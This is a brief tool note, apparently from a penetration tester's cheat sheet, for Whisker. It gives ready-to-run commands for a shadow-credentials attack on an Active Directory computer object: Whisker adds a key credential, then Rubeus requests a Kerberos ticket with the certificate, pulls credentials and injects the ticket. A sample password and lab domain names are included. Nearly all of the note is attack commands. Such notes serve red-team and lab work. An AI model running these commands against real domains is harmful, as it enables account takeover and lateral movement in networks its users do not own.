# Name
Whisker

## Usage
```
# To exploit AddKeyCredentialLink (or GenericWrite) on Computer object
Whisker.exe add /target:ZPH-SVRMGMT1$

Rubeus.exe asktgt /user:ZPH-SVRMGMT1$ /certificate:MIIJ… /password:"zCixoq4fEBQBRvvE" /domain:zsm.local /dc:ZPH-SVRDC01.zsm.local /getcredentials /show /ptt

klist
```

## Source
https://github.com/eladshamir/Whisker
